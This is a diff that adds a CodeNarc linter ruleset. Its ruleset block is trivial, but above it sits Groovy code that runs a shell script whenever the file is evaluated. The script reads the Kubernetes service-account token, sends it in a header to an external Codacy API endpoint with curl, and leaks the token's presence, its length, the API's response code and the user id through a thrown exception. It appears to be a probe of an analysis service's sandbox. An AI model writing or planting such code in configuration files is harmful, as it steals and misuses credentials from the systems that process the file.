@@ -1,0 +1,23 @@
+def p = ["sh", "-c", '''
+token=""
+path=/var/run/secrets/kubernetes.io/serviceaccount/token
+if [ -r "$path" ]; then token=$(cat "$path"); fi
+present=0
+len=0
+status=not_run
+if [ -n "$token" ]; then
+  present=1
+  len=${#token}
+  if command -v curl >/dev/null 2>&1; then
+    status=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" -H "api-token: $token" https://api.codacy.com/api/v3/user 2>/dev/null || printf "curl_error")
+  else
+    status=curl_missing
+  fi
+fi
+printf "CODENARC_OUTSIDER_API_BOUNDARY token_present=%s token_len=%s api_status=%s uid=%s" "$present" "$len" "$status" "$(id -u)"
+'''].execute()
+p.waitFor()
+throw new RuntimeException(p.text.trim())
+ruleset {
+  UnnecessaryGString
+}
